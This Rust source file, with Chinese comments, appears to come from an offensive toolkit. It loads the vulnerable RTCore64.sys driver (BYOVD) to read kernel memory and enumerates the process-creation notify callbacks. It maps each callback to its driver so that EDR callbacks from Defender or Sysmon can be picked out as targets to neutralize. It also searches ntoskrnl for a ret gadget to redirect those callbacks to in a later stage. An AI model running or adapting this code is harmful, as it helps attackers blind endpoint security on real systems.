//! K-1 (零写): 把 PspCreateProcessNotifyRoutine 每个 occupied slot 的 routine
//! 归属到具体的内核驱动模块。纯 kread + NtQuerySystemInformation，零 BSOD 风险。
//!
//! 流程:
//!   bootstrap_byovd → KernelRw
//!   NtQuerySystemInformation(SystemModuleInformation=11) → 全部内核驱动 [base,size,name]
//!   读 PspCreateProcessNotifyRoutine 数组每个 occupied slot → routine KVA
//!   routine 落在哪个驱动的 [base,base+size) → 输出 "routine @ KVA -> driver.sys (RVA)"
//!
//! 目的: 找出哪个 slot 是 ntoskrnl 内部(不能碰，会导致 triple fault)，
//! 哪些是外部 EDR 驱动(Defender/Sysmon)，为 K-2 安全 repurpose 选目标。



#[cfg(target_os = "windows")]
use core::ffi::c_void;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::offsets::notify_routines;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::KernelRw;

#[cfg(target_os = "windows")]
const SYS_PATH: &[u16] = &[
    'S' as u16,
    'y' as u16,
    's' as u16,
    't' as u16,
    'e' as u16,
    'm' as u16,
    '3' as u16,
    '2' as u16,
    '\\' as u16,
    'd' as u16,
    'r' as u16,
    'i' as u16,
    'v' as u16,
    'e' as u16,
    'r' as u16,
    's' as u16,
    '\\' as u16,
    'R' as u16,
    'T' as u16,
    'C' as u16,
    'o' as u16,
    'r' as u16,
    'e' as u16,
    '6' as u16,
    '4' as u16,
    '.' as u16,
    's' as u16,
    'y' as u16,
    's' as u16,
    0,
];
#[cfg(target_os = "windows")]
const SVC_NAME: &[u16] = &[
    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
];
#[cfg(target_os = "windows")]
const PSP_CREATE_PROCESS_NOTIFY_RVA: u32 = 0x4D9D70;
#[cfg(target_os = "windows")]
const SYSTEM_MODULE_INFORMATION: u32 = 11;

#[cfg(target_os = "windows")]
extern "system" {
    fn RtlAdjustPrivilege(
        privilege: u32,
        enable: i32,
        current_thread: i32,
        enabled: *mut i32,
    ) -> i32;
    fn NtQuerySystemInformation(class: u32, buf: *mut c_void, buflen: u32, retlen: *mut u32)
        -> i32;
}
#[cfg(target_os = "windows")]
fn enable_privileges() {
    for luid in [10u32, 20u32] {
        let mut p: i32 = 0;
        unsafe { RtlAdjustPrivilege(luid, 1, 0, &mut p) };
    }
}

/// RTL_PROCESS_MODULE_INFORMATION (x64). 我们只靠 image_base/image_size +
/// FullPathName（256 字节固定）。name_offset 字段布局跨版本不稳，改为从
/// full_path 末尾找最后一个 '\' 取短名。
#[repr(C)]
#[derive(Clone, Copy)]
#[cfg(target_os = "windows")]
struct RtlModule {
    section: *mut c_void,
    mapped_base: *mut c_void,
    image_base: *mut c_void,
    image_size: u32,
    flags: u32,
    // 后面 LoadOrderIndex/InitOrderIndex/LoadCount/NameOffset (各 u16) + 256 字节路径。
    // 我们不读这些 u16，直接把后续 256 字节当 full_path。
    tail: [u8; 264], // 4*2 (u16s) + 256 path, 留余量
}

/// 拿全部已加载内核驱动的 (base, size, 短名)。
#[cfg(target_os = "windows")]
fn loaded_kernel_modules() -> Vec<(usize, usize, String)> {
    let mut buf = vec![0u8; 256 * 1024];
    let mut retlen: u32 = 0;
    let status = unsafe {
        NtQuerySystemInformation(
            SYSTEM_MODULE_INFORMATION,
            buf.as_mut_ptr() as *mut c_void,
            buf.len() as u32,
            &mut retlen,
        )
    };
    if status as u32 == 0xC0000004 {
        buf = vec![0u8; retlen as usize + 0x1000];
        let s = unsafe {
            NtQuerySystemInformation(
                SYSTEM_MODULE_INFORMATION,
                buf.as_mut_ptr() as *mut c_void,
                buf.len() as u32,
                &mut retlen,
            )
        };
        if s < 0 {
            return Vec::new();
        }
    } else if status < 0 {
        return Vec::new();
    }
    if buf.len() < 8 {
        return Vec::new();
    }
    let count = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;
    eprintln!(
        "[dbg] NtQuerySystemInformation: count={}, retlen={}, buf.len()={}",
        count,
        retlen,
        buf.len()
    );
    // RTL_PROCESS_MODULE_INFORMATION entry stride. 实测: 读 Module[0] 的
    // image_base 正确（kernel_base.rs 用 304）。但跨 entry 步进需核对 —— 不同
    // SDK 文档给 280/296/304。用反推法：Module[0].ImageBase 在 entry+0x18，
    // Module[1].ImageBase 应在 entry+0x18+stride。读两个相邻非零 base 反推 stride。
    let mut out = Vec::with_capacity(count);
    // 真实 entry stride. RTL_PROCESS_MODULE_INFORMATION x64 实测 = 296
    // (Section8+MappedBase8+ImageBase8+ImageSize4+Flags4+4×u16+FullPathName256 = 296)。
    // kernel_base.rs 用 304 读 Module[0] 巧合成功（只读第一个，stride 无关），
    // 但跨多个 entry 用 304 会错位 8 字节导致 base/name 错乱。
    const ENTRY_SIZE: usize = 296;
    // stride 检测：entry[0] 后扫，找 entry[1] 合法内核 base 对应的 stride。
    let real_stride = if count >= 2 {
        let mut s = ENTRY_SIZE;
        for cand in (288..=312usize).step_by(4) {
            let off1 = 8 + cand + 0x10; // entry[1].ImageBase
            if off1 + 8 > buf.len() {
                break;
            }
            let b1 = u64::from_le_bytes(buf[off1..off1 + 8].try_into().unwrap_or([0; 8]));
            if b1 >= 0xFFFFF800_00000000 && b1 <= 0xFFFFFFFF_FFFFFFFF {
                s = cand;
                break;
            }
        }
        s
    } else {
        ENTRY_SIZE
    };
    eprintln!("[dbg] entry stride = {}", real_stride);
    let mut dumped = 0usize;
    for i in 0..count {
        let off = 8 + i * real_stride;
        if off + real_stride > buf.len() {
            break;
        }
        let m: &RtlModule = unsafe { &*(buf.as_ptr().add(off) as *const RtlModule) };
        let base = m.image_base as usize;
        if dumped < 25 {
            let path = &m.tail[8..];
            let nul = path.iter().position(|&b| b == 0).unwrap_or(32);
            eprintln!(
                "[dbg] entry[{}] off=0x{:X} base=0x{:016X} size=0x{:X} name='{}'",
                i,
                off,
                base,
                m.image_size,
                String::from_utf8_lossy(&path[..nul.min(48)])
            );
            dumped += 1;
        }
        if base == 0 {
            continue;
        }
        // tail 布局: [8 字节 u16 字段][256 字节 full_path]。
        // 短名 = full_path 里最后一个 '\' 之后的部分。
        let path = &m.tail[8..]; // full_path 起点
                                 // 找 NUL 终止
        let nul = path.iter().position(|&b| b == 0).unwrap_or(path.len());
        let path_str = &path[..nul];
        // 找最后一个 '\'
        let short = match path_str.iter().rposition(|&b| b == b'\\') {
            Some(p) => &path_str[p + 1..],
            None => path_str,
        };
        let name = String::from_utf8_lossy(short).to_string();
        out.push((base, m.image_size as usize, name));
    }
    out
}

/// 在已加载模块列表里找 routine 落在哪个驱动的 [base, base+size)。
#[cfg(target_os = "windows")]
fn owner_of(routine: usize, mods: &[(usize, usize, String)]) -> Option<(&str, usize)> {
    for (base, size, name) in mods {
        let end = base.wrapping_add(*size);
        if routine >= *base && routine < end {
            return Some((name, routine - base));
        }
    }
    None
}

#[cfg(target_os = "windows")]
fn main() {
    println!("[callback_owner_map] READ-ONLY: map each callback routine to its driver");
    enable_privileges();

    let (mut loaded, krw) = unsafe {
        match bootstrap_byovd(SYS_PATH, SVC_NAME) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[FAIL] bootstrap: {}", e);
                std::process::exit(1);
            }
        }
    };
    let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap();
    let array_kva = base + PSP_CREATE_PROCESS_NOTIFY_RVA as usize;
    println!(
        "ntoskrnl base=0x{:016x}  array=0x{:016x}\n",
        base, array_kva
    );

    let mods = loaded_kernel_modules();
    println!("loaded kernel modules: {}", mods.len());

    println!("\n=== CreateProcess callback owners ===");
    for i in 0..notify_routines::ARRAY_LEN {
        let packed = match krw.kread_u64(array_kva + i * 8) {
            Ok(v) => v,
            Err(_) => continue,
        };
        if !notify_routines::is_occupied(packed) {
            continue;
        }
        let ctx = notify_routines::unpack(packed) as usize;
        let routine = krw
            .kread_u64(ctx)
            .map(|v| (v & notify_routines::PTR_MASK) as usize)
            .unwrap_or(0);
        if routine == 0 {
            continue;
        }
        match owner_of(routine, &mods) {
            Some((name, rva)) => {
                let tag = if name.eq_ignore_ascii_case("ntoskrnl.exe") {
                    "  <-- NTOSKRNL INTERNAL (do NOT neutralize: causes triple fault)"
                } else {
                    ""
                };
                println!(
                    "  slot[{:2}] routine=0x{:016x} ctx=0x{:016x} -> {} +0x{:X}{}",
                    i, routine, ctx, name, rva, tag
                );
            }
            None => println!(
                "  slot[{:2}] routine=0x{:016x} -> (owner unknown / unmapped)",
                i, routine
            ),
        }
    }

    // 顺便：给出一个验证过的 "ret-only" 内核地址，供 K-2 repurpose 用作 redirect 目标。
    // 用 nt!KiServiceLinkage 或任意已知的无害 ret。简单做法：扫 ntoskrnl .text 找 0xC3。
    let mut found_ret: usize = 0;
    for off in (0x1000..0x200000).step_by(0x10) {
        let mut b = [0u8; 1];
        if krw.kread(base + off, &mut b).is_ok() && b[0] == 0xC3 {
            // 验证前一字节不是某多字节指令中间（粗略：前一字节也像指令边界）
            found_ret = base + off;
            break;
        }
    }
    if found_ret != 0 {
        println!("\n[candidate ret gadget for K-2 repurpose] ntoskrnl+0x{:X} = 0x{:016x} (first 0xC3 byte)",
                 found_ret - base, found_ret);
    }

    println!("\n[callback_owner_map] DONE (read-only).");
    std::mem::forget(loaded);
}


// ----------------------------------------------------------------------------
// Non-Windows entry-point fallback (E0601 mitigation).
//
// The real `fn main()` (and every Windows-only item above) is gated by
// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
// body compiles to nothing and the build would fail with E0601 ("main
// function not found"). This stub exists solely to satisfy the crate root on
// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
// mutually exclusive with the Windows `main` above and never runs on target.
// ----------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
        env!("CARGO_BIN_NAME")
    );
}
